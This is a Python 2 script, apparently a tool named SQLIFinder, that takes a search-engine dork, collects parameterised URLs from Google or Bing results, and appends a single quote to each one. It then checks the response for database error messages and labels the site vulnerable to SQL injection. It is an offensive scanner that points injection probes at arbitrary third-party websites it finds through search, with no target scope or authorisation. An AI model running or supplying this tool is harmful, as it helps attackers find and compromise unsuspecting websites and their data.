#!/usr/bin/python

import sys
import urllib2
import argparse
from datetime import datetime

def banner():
	print green + "\n\n ____   ___  _     ___ _____ _           _           "
 	print "/ ___| / _ \| |   |_ _|  ___(_)_ __   __| | ___ _ __ "
 	print "\___ \| | | | |    | || |_  | | '_ \ / _` |/ _ \ '__|"
 	print " ___) | |_| | |___ | ||  _| | | | | | (_| |  __/ |   "
 	print "|____/ \__\_\_____|___|_|   |_|_| |_|\__,_|\___|_|Coded by: mqc\n\n" + d

def check(url):
	sys.stdout.write(green + "[-] Found: " + url + " => " + d)
	sys.stdout.flush()
	try:
		r = requests.get(url + "'", timeout=10)
		if "MySQL" in r.content or "mysql" in r.content:
			print bgreen + "Vulnerable\tDatabase: MySQL" + d
		elif "syntax error" in r.content:
			print bgreen + "Vulnerable\tDatabase: PostGRES" + d
		elif "native client" in r.content:
			print bgreen + "Vulnerable\tDatabase: MSSQL" + d
		elif "You have an error in your SQL syntax;" in r.content:
			print bgreen + "Vulnerable\tDatabase: Unknown" + d
		elif "ORA" in r.content:
			print bgreen + "Vulnerable\tDatabase: Oracle" + d
		elif "MariaDB" in r.content:
			print bgreen + "Vulnerable\tDatabase: MariaDB" + d
		else:
			print yellow + "Not vulnerable" + d
	except requests.exceptions.ConnectionError:
		print red + "Connection lost" + d
	except requests.exceptions.Timeout:
		print red + "Request timed out" + d

def search_bing(dork, results):
	count = 1
	rcount = 0
	finish = False
	while True:
		r = requests.get("https://www.bing.com/search?q=" + dork + "&first=" + str(count))
		s = bs(r.content, "lxml")
		for url in s.findAll("a", href=True):
			url = url["href"]
			if "http" in url and "www.microsofttranslator.com" not in url and "go.microsoft.com" not in url and "www.facebook.com" not in url:
				if "?" in url and "=" in url:
					check(url)
					rcount += 1
					if rcount == results:
						finish = True
						break
			else:
				pass
		if finish == True:
			break
		else:
			count += 10

def search_google(dork, results):
	count = 0
	try:
		for url in search(dork):
			if "?" in url and "=" in url:
				check(url)
				count += 1
				if count == results:
					break
			else:
				pass
	except urllib2.HTTPError:
		print red + "[!] Error: cannot search google at the moment" + d

def main():
	global d
	global bs
	global red
	global green
	global yellow
	global bgreen
	global search
	global requests
	d = "\033[0m"
	red = "\033[31m"
	green = "\033[32m"
	yellow = "\033[33m"
	bgreen = "\033[32;1m"
	banner()
	print green + "Started at: " + str(datetime.time(datetime.now())) + "\n" + d
	try:
        	import requests
	except ImportError:
	        print red + "[!] Error: requests isn't installed" + d
        	print red + "[!] Install it with: pip install requests" + d 
	try:
	        from googlesearch import search
	except ImportError:
        	print red + "[!] Error: google isn't installed" + d
        	print red + "[!] Install it with: pip install google" + d
	try:
		from bs4 import BeautifulSoup as bs
	except ImportError:
		print red + "[!] Error: bs4 isn't installed" + d
                print red + "[!] Install it with: pip install bs4" + d
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", "--dork", dest="dork", type=str, help="dork name")
	parser.add_argument("-e", "--engine", dest="engine", type=str, help="search engine")
	parser.add_argument("-r", "--results", dest="results", type=int, help="results")
	args = parser.parse_args()
	if args.dork and args.engine and args.results:
		dork = args.dork
		engine = args.engine
		results = args.results
		if engine == "google" or engine == "bing":
			print green + "[-] Searching " + engine + " for " + str(results) + " urls with dork: " + dork + d
			if engine == "bing":
				search_bing(dork, results)
			else:
				search_google(dork, results)
		else:
			print red + "[!] Error: select a valid search engine"
			print "[!] Available engines: google - bing" + d
	else:
		print green + "[!] Usage: python SQLIFinder.py -d <dork> -e <engine> -r <results>" + d
	raise KeyboardInterrupt

try:
	main()
except KeyboardInterrupt:
	print green + "\nEnded at: " + str(datetime.time(datetime.now())) + d
	sys.exit()
